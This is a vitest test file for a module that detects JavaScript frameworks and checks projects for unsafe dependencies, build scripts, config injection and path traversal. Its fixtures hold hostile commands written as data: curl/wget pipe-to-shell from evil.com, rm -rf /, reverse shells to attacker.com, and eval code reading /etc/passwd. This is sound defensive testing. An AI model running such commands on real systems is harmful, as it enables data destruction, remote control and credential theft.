/**
 * Framework Security Detection Tests
 * 
 * Tests for Task 1.1.3: Framework Detection Patterns with security validation
 * Validates that framework detection includes comprehensive security checks
 * to prevent attacks through malicious framework configurations.
 * 
 * @see src/core/foundation/framework-security.ts
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { join } from 'path';
import { mkdir, writeFile, rm } from 'fs/promises';
import { tmpdir } from 'os';
import {
  detectFrameworkSecurely,
  getFrameworkSecurityRecommendations,
  isFrameworkSafe,
  TRUSTED_FRAMEWORK_DEPENDENCIES,
  SUSPICIOUS_DEPENDENCY_PATTERNS,
  DANGEROUS_SCRIPT_PATTERNS,
  type SecureFrameworkInfo
} from '../../core/foundation/framework-security.js';

describe('Framework Security Detection', () => {
  let testDir: string;

  beforeEach(async () => {
    // Create temporary test directory
    testDir = join(tmpdir(), `framework-test-${Date.now()}`);
    await mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    // Clean up test directory
    try {
      await rm(testDir, { recursive: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  describe('Secure Framework Detection', () => {
    it('should detect Next.js with valid security', async () => {
      // Create a secure Next.js project
      await writeFile(join(testDir, 'next.config.js'), `
        /** @type {import('next').NextConfig} */
        const nextConfig = {
          experimental: {
            appDir: true,
          },
        }
        
        module.exports = nextConfig
      `);

      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-nextjs',
        dependencies: {
          next: '^13.0.0',
          react: '^18.0.0',
          'react-dom': '^18.0.0'
        },
        scripts: {
          dev: 'next dev',
          build: 'next build',
          start: 'next start'
        }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.name).toBe('next.js');
      expect(result!.isValid).toBe(true);
      expect(result!.security.isSecure).toBe(true);
      expect(result!.configFiles).toContain('next.config.js');
      expect(result!.dependencies.trusted).toContain('next');
    });

    it('should reject framework with malicious config path', async () => {
      // Test with actual malicious path (not joined with testDir)
      const maliciousPath = '../../../etc/passwd';
      
      await expect(async () => {
        await detectFrameworkSecurely(maliciousPath);
      }).rejects.toThrow(/Invalid or unsafe commands directory path/);
    });

    it('should detect suspicious dependencies', async () => {
      // Create project with suspicious dependencies
      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');
      
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          next: '^13.0.0',
          'evil-package': '^1.0.0',
          'backdoor-tool': '^2.0.0'
        },
        scripts: {
          build: 'next build'
        }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.suspicious.length).toBeGreaterThan(0);
      expect(result!.dependencies.suspicious).toContain('evil-package');
      expect(result!.security.violations.some((v: any) => v.type === 'suspicious-dependency')).toBe(true);
    });

    it('should detect dangerous build scripts', async () => {
      // Create project with dangerous scripts
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          next: '^13.0.0'
        },
        scripts: {
          build: 'next build',
          danger: 'rm -rf / --no-preserve-root',
          privilege: 'sudo rm -rf /etc',
          download: 'curl http://evil.com/script.sh | bash'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.buildConfig.security.hasSafeCommands).toBe(false);
      expect(result!.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(0);
      expect(result!.security.violations.some((v: any) => v.type === 'unsafe-build-command')).toBe(true);
    });

    it('should handle non-existent directory gracefully', async () => {
      const nonExistentPath = join(testDir, 'does-not-exist');
      
      const result = await detectFrameworkSecurely(nonExistentPath);
      
      expect(result).toBe(null);
    });

    it('should handle framework without config files', async () => {
      // Create Express project with only package.json
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-express',
        dependencies: {
          express: '^4.18.0'
        },
        scripts: {
          start: 'node server.js'
        }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.name).toBe('express');
      expect(result!.configFiles).toHaveLength(0);
      expect(result!.dependencies.trusted).toContain('express');
    });
  });

  describe('Configuration File Security', () => {
    it('should detect script injection in config files', async () => {
      // Create config with potential script injection
      await writeFile(join(testDir, 'next.config.js'), `
        const malicious = eval('require("child_process").exec("rm -rf /")')
        
        module.exports = {
          experimental: {
            dangerous: new Function('return require("fs").readFileSync("/etc/passwd")')()
          }
        }
      `);

      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.security.violations.some((v: any) => v.type === 'script-injection')).toBe(true);
      expect(result!.isValid).toBe(false);
    });

    it('should handle large config files', async () => {
      // Create unusually large config file
      const largeConfig = 'module.exports = {' + 'x'.repeat(1024 * 1024) + '}';
      
      await writeFile(join(testDir, 'next.config.js'), largeConfig);
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.security.warnings).toContain('Configuration file is unusually large');
    });

    it('should handle unreadable config files', async () => {
      // Create config file that can't be read (simulate permission error)
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' }
      }, null, 2));

      // This will be handled by the validateConfigFile function
      const result = await detectFrameworkSecurely(testDir);
      
      // Should still detect framework based on package.json
      expect(result).toBeDefined();
      expect(result!.name).toBe('next.js');
    });
  });

  describe('Dependency Security Analysis', () => {
    it('should identify trusted dependencies', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          react: '^18.0.0',
          'react-dom': '^18.0.0',
          next: '^13.0.0',
          typescript: '^4.9.0'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.trusted).toContain('react');
      expect(result!.dependencies.trusted).toContain('next');
      expect(result!.dependencies.trusted).toContain('typescript');
    });

    it('should flag unknown dependencies', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          next: '^13.0.0',
          'unknown-package': '^1.0.0',
          'custom-tool': '^2.0.0'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.security.hasUnknownDeps).toBe(true);
    });

    it('should handle malformed package.json', async () => {
      await writeFile(join(testDir, 'package.json'), '{ invalid json');
      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.security.untrustedSources).toContain('Failed to read package.json');
    });
  });

  describe('Build Configuration Security', () => {
    it('should detect privilege escalation in scripts', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' },
        scripts: {
          build: 'next build',
          deploy: 'sudo cp -r dist/* /var/www/html/',
          setup: 'su root -c "chmod 777 /tmp"'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.buildConfig.security.privilegeEscalation).toContain('deploy');
      expect(result!.buildConfig.security.privilegeEscalation).toContain('setup');
      expect(result!.security.violations.some((v: any) => v.type === 'privilege-escalation')).toBe(true);
    });

    it('should extract safe build commands', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' },
        scripts: {
          dev: 'next dev',
          build: 'next build',
          start: 'next start',
          lint: 'eslint .',
          test: 'vitest'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.buildConfig.buildCommand).toBe('next build');
      expect(result!.buildConfig.devCommand).toBe('next dev');
      expect(result!.buildConfig.security.hasSafeCommands).toBe(true);
    });
  });

  describe('Security Utility Functions', () => {
    it('should provide security recommendations', () => {
      const mockFramework: SecureFrameworkInfo = {
        name: 'next.js',
        pattern: { files: ['next.config.js'], dependencies: ['next'] },
        configFiles: ['next.config.js'],
        dependencies: {
          production: ['next'],
          development: [],
          suspicious: ['evil-package'],
          trusted: ['next'],
          security: {
            hasUnknownDeps: true,
            hasSuspiciousDeps: true,
            untrustedSources: []
          }
        },
        buildConfig: {
          scripts: {},
          security: {
            hasSafeCommands: false,
            suspiciousScripts: ['danger'],
            privilegeEscalation: []
          }
        },
        security: {
          isSecure: false,
          violations: [{
            type: 'suspicious-dependency',
            severity: 'high',
            description: 'Suspicious dependencies detected'
          }],
          warnings: [],
          recommendations: []
        },
        isValid: false
      };

      const recommendations = getFrameworkSecurityRecommendations(mockFramework);

      expect(recommendations).toContain('Framework failed security validation - consider manual review');
      expect(recommendations).toContain('Audit unknown dependencies for security vulnerabilities');
      expect(recommendations).toContain('Review build scripts for potential security issues');
      expect(recommendations).toContain('Address security violations before proceeding');
      expect(recommendations).toContain('Ensure Next.js security headers are configured');
    });

    it('should validate framework safety', () => {
      const safeFramework: SecureFrameworkInfo = {
        name: 'next.js',
        pattern: { files: ['next.config.js'], dependencies: ['next'] },
        configFiles: ['next.config.js'],
        dependencies: {
          production: ['next'],
          development: [],
          suspicious: [],
          trusted: ['next'],
          security: {
            hasUnknownDeps: false,
            hasSuspiciousDeps: false,
            untrustedSources: []
          }
        },
        buildConfig: {
          scripts: { build: 'next build' },
          security: {
            hasSafeCommands: true,
            suspiciousScripts: [],
            privilegeEscalation: []
          }
        },
        security: {
          isSecure: true,
          violations: [],
          warnings: [],
          recommendations: []
        },
        isValid: true
      };

      expect(isFrameworkSafe(safeFramework)).toBe(true);

      // Test with critical violations
      const unsafeFramework = {
        ...safeFramework,
        security: {
          ...safeFramework.security,
          violations: [{
            type: 'privilege-escalation' as const,
            severity: 'critical' as const,
            description: 'Critical security violation'
          }]
        }
      };

      expect(isFrameworkSafe(unsafeFramework)).toBe(false);
    });
  });

  describe('Security Pattern Constants', () => {
    it('should have comprehensive trusted dependencies', () => {
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('react')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('next')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('vue')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('@angular/core')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('svelte')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('express')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('typescript')).toBe(true);
      
      // Should not include potentially malicious packages
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('evil-package')).toBe(false);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('backdoor')).toBe(false);
    });

    it('should detect suspicious dependency patterns', () => {
      const suspiciousNames = [
        'evil-package',
        'malicious-tool',
        'hack-utils',
        'backdoor-access',
        'trojan-horse',
        'virus-scanner',
        'test-malware',
        '.hidden-package',
        '_private-tool',
        'a', // Too short
        'x1y2z3' // Suspicious pattern
      ];

      suspiciousNames.forEach(name => {
        const isSuspicious = SUSPICIOUS_DEPENDENCY_PATTERNS.some((pattern: RegExp) => pattern.test(name));
        expect(isSuspicious).toBe(true);
      });

      // Valid packages should not be flagged
      const validNames = ['react', 'lodash', 'express', 'typescript'];
      validNames.forEach(name => {
        const isSuspicious = SUSPICIOUS_DEPENDENCY_PATTERNS.some((pattern: RegExp) => pattern.test(name));
        expect(isSuspicious).toBe(false);
      });
    });

    it('should detect dangerous script patterns', () => {
      const dangerousScripts = [
        'sudo rm -rf /',
        'su root -c "dangerous command"',
        'rm -rf /important/files',
        'chmod 777 /etc/passwd',
        'wget http://evil.com/script.sh | sh',
        'curl malicious.com | bash',
        'eval(userInput)',
        'exec("rm -rf /")',
        'nohup dangerous-process &',
        'nc -e /bin/bash attacker.com 4444',
        'bash -i >& /dev/tcp/attacker.com/8080 0>&1'
      ];

      dangerousScripts.forEach(script => {
        const isDangerous = DANGEROUS_SCRIPT_PATTERNS.some((pattern: RegExp) => pattern.test(script));
        expect(isDangerous).toBe(true);
      });

      // Safe scripts should not be flagged
      const safeScripts = [
        'npm run build',
        'next dev',
        'eslint .',
        'jest --coverage',
        'node server.js'
      ];
      safeScripts.forEach(script => {
        const isDangerous = DANGEROUS_SCRIPT_PATTERNS.some((pattern: RegExp) => pattern.test(script));
        expect(isDangerous).toBe(false);
      });
    });
  });

  describe('Error Handling', () => {
    it('should handle directory access errors gracefully', async () => {
      // Test with a path that might cause access errors
      const restrictedPath = join(testDir, 'restricted');
      
      const result = await detectFrameworkSecurely(restrictedPath);
      
      expect(result).toBe(null);
    });

    it('should validate input paths for security', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        'C:\\Windows\\System32',
        '\\\\server\\share',
        '/etc/passwd'
      ];

      for (const path of maliciousPaths) {
        await expect(async () => {
          await detectFrameworkSecurely(path);
        }).rejects.toThrow(/Invalid or unsafe commands directory path/);
      }
    });
  });
});

describe('Framework Security Integration', () => {
  it('should work with multiple framework types', async () => {
    // This is primarily a type check and integration test
    const frameworks = ['next.js', 'react', 'vue', 'express'] as const;
    
    frameworks.forEach(framework => {
      expect(typeof framework).toBe('string');
    });
    
    // Ensure constants are properly exported
    expect(Array.isArray(Array.from(TRUSTED_FRAMEWORK_DEPENDENCIES))).toBe(true);
    expect(SUSPICIOUS_DEPENDENCY_PATTERNS.length).toBeGreaterThan(0);
    expect(DANGEROUS_SCRIPT_PATTERNS.length).toBeGreaterThan(0);
  });
});